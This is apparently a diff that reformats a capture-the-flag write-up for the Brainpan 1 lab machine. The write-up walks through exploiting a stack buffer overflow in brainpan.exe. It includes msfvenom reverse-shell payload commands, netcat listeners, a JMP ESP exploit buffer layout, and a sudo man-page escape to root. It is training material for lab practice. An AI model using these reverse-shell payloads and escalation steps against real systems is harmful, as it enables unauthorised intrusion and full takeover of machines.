@@ -2,22 +2,23 @@
 sticker: emoji//1f9e0
 ---
 
-# BRAINPAN 1
+# PORT SCAN
+---
 
-## PORT SCAN
-
-***
 
 | PORT  | SERVICE |
-| ----- | ------- |
+| :---- | :------ |
 | 9999  | ABYSS?  |
 | 10000 | HTTP    |
 
-## RECONNAISSANCE
 
-***
+
+# RECONNAISSANCE
+---
+
 
 Since we got a website, we can fuzz at first, this is a `Buffer Overflow` room, so, we need a way to get the file running from behind the port `9999`, let's fuzz first:
+
 
 ```
 ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u "http://10.10.87.171:10000/FUZZ" -ic -c -t 200
@@ -47,9 +48,10 @@ bin                     [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 182
 
 Inside of `/bin` we can find this:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250531142913.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250531142913.png)
 
 We got the `brainpan.exe` file, this is the same file running on port `9999`, we can test this by using netcat:
+
 
 ```
 nc 10.10.87.171 9999
@@ -68,11 +70,12 @@ _|_|_|    _|          _|_|_|  _|  _|    _|  _|_|_|      _|_|_|  _|    _|
                           ACCESS DENIED
 ```
 
+
 The `PASSWORD` parameter is vulnerable to buffer overflow, we can test this by locally testing the file inside of a windows vm with immunity debugger and mona, this room is similar to `Buffer Overflow Prep` `Gatekeeper` and the `Brainstorm` machine, the exploitation process is the same, you need to use immunity debugger to exploit the file and get a shell by taking advantage of the buffer overflow, knowing this, we can begin exploitation.
 
-## EXPLOITATION
 
-***
+# EXPLOITATION
+---
 
 For the sake of the process, I will enumerate the process you need to do in order to craft the exploit and will also provide the exploit at the end if you failed to reproduce any steps, we will need this first:
 
@@ -80,29 +83,31 @@ For the sake of the process, I will enumerate the process you need to do in orde
 2. Immunity Debugger
 3. Mona
 
+
 We can install both tools inside of the windows machine, once we got them, we need to do this:
 
-#### **Reverse Engineer the Executable**
 
-* Load `brainpan.exe` into **Immunity Debugger** on a **Windows VM**.
-* Run a basic **Python script** from Kali (or your host) that connects to port `9999` and sends test data (e.g., the string "password").
-* Observe how the application responds to inputs (especially long ones).
+### **Reverse Engineer the Executable**
 
-#### **Trigger the Crash**
+- Load `brainpan.exe` into **Immunity Debugger** on a **Windows VM**.
+- Run a basic **Python script** from Kali (or your host) that connects to port `9999` and sends test data (e.g., the string "password").
+- Observe how the application responds to inputs (especially long ones).
 
-* Modify your script to send a long string (like `"A"*600`) and watch Immunity for an **Access Violation**.
-* Confirm that the EIP register gets overwritten with `0x41414141` (which is `'A'` in hex), proving it's a **buffer overflow**.
+### **Trigger the Crash**
 
-#### **Find the EIP Offset**
+- Modify your script to send a long string (like `"A"*600`) and watch Immunity for an **Access Violation**.
+- Confirm that the EIP register gets overwritten with `0x41414141` (which is `'A'` in hex), proving it's a **buffer overflow**.
 
-* Use Metasploit tools:
+### **Find the EIP Offset**
+
+- Use Metasploit tools:
 
 ```
 /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 600
 ```
 
-* Replace `"A"*600` in your script with the generated pattern.
-* Note the EIP value in Immunity (For example: `35724134`), and find its offset:
+- Replace `"A"*600` in your script with the generated pattern.
+- Note the EIP value in Immunity (For example: `35724134`), and find its offset:
 
 ```
 /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 35724134
@@ -114,21 +119,21 @@ Suppose it returns **524**, then confirm by sending:
 "A"*524 + "B"*4 + "C"*(600-524-4)
 ```
 
-#### **Check for Bad Characters**
+### **Check for Bad Characters**
 
-* Generate a byte string of all possible values (`\x01` to `\xff`):
+- Generate a byte string of all possible values (`\x01` to `\xff`):
 
 ```python
 badchars = b"".join([bytes([x]) for x in range(1, 256)])
 ```
 
-* Inject it after your 524 `A`s and 4-byte padding.
-* Use Immunity → **Right-click ESP → Follow in Dump**, and inspect if any bytes are missing or altered.
-* Exclude bad chars.
+- Inject it after your 524 `A`s and 4-byte padding.
+- Use Immunity → **Right-click ESP → Follow in Dump**, and inspect if any bytes are missing or altered.
+- Exclude bad chars.
 
-#### **Find a JMP ESP Instruction**
+### **Find a JMP ESP Instruction**
 
-* Install and use `mona.py`:
+- Install and use `mona.py`:
 
 ```
 !mona modules
@@ -136,17 +141,18 @@ badchars = b"".join([bytes([x]) for x in range(1, 256)])
 
 Look for a module with no memory protections (like DEP, ASLR, etc.).
 
-* Find the `JMP ESP` address in the chosen module:
+- Find the `JMP ESP` address in the chosen module:
 
 ```
 !mona find -s "\xff\xe4" -m brainpan.exe
 ```
 
-* Suppose the address is `0x311712f3`, convert it to little-endian:
+- Suppose the address is `0x311712f3`, convert it to little-endian:
 
-#### **Create the Final Exploit Payload**
 
-* Generate shellcode (reverse shell, bind shell, etc.) with `msfvenom`:
+### **Create the Final Exploit Payload**
+
+- Generate shellcode (reverse shell, bind shell, etc.) with `msfvenom`:
 
 ```
 msfvenom -p windows/shell_reverse_tcp LHOST=<YOUR_IP> LPORT=4444 EXITFUNC=thread -b "\x00" -f python
@@ -163,32 +169,33 @@ payload = <your generated shellcode>
 buffer = padding + eip + nop_sled + payload
 ```
 
-#### **Test Locally**
+### **Test Locally**
 
-* Run the Python exploit while the target is on your Windows VM.
-* Start a `nc -lvnp 4444` listener.
-* Verify that a reverse shell is received.
+- Run the Python exploit while the target is on your Windows VM.
+- Start a `nc -lvnp 4444` listener.
+- Verify that a reverse shell is received.
 
-#### **Exploit the Actual Linux Target**
 
-* Replace the payload with one for Linux (since the remote app runs on a Linux machine):
+### **Exploit the Actual Linux Target**
+
+- Replace the payload with one for Linux (since the remote app runs on a Linux machine):
 
 ```
 msfvenom -p linux/x86/shell_reverse_tcp LHOST=IP LPORT=4444 EXITFUNC=thread -f c -a x86 -b "\x00"
 ```
 
-* Use the same structure in the script (adjust the shellcode only).
-* Run a netcat listener again:
+- Use the same structure in the script (adjust the shellcode only).
+- Run a netcat listener again:
 
 ```
 nc -lvnp 4444
 ```
 
-* Send the exploit and you'll get a shell
+- Send the exploit and you'll get a shell
 
-### Exploit
 
-***
+## Exploit
+---
 
 Knowing the steps we need to reproduce in order to get a shell, we can use the following exploit after we've followed everything:
 
@@ -257,13 +264,14 @@ s.close()
 
 Ok, we got the exploit, let's send it and check our listener then:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250531145124.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250531145124.png)
 
 As seen, we get a reverse shell as `puck`, let's proceed with privilege escalation.
 
-## PRIVILEGE ESCALATION
 
-***
+# PRIVILEGE ESCALATION
+---
+
 
 We already exploited the `buffer overflow` and got ourselves a shell, since we are dealing with a Linux machine, we can stabilize our shell:
 
@@ -277,11 +285,11 @@ export TERM=xterm
 export BASH=bash
 ```
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250531145244.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250531145244.png)
 
 Nice, with everything in order, let's check for a PE vector, we can use `linpeas` for that:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250531145442.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250531145442.png)
 
 We can see we got a binary named `anansi_util` on here that we can run as sudo without a password, let's check it out:
 
@@ -296,7 +304,7 @@ Where [action] is one of:
 
 The PE vector on this binary is the use of `manual` command, the man command on Linux is used to display the user manual of any command we run on the terminal, the issue on this, is that we can exploit it to get a root as shell, let's refer to `GTFOBINS` to check the PE:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250531145755.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250531145755.png)
 
 So, in order to exploit this, we need to do:
 
@@ -307,10 +315,11 @@ sudo /home/anansi/bin/anansi_util manual id # ID CAN BE REPLACED WITH ANY COMMAN
 
 Once we do that, we get:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250531145921.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250531145921.png)
 
 We got a shell as root. Inside of root's directory, we can find `b.txt`:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250531150016.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250531150016.png)
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250531150056.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250531150056.png)
+
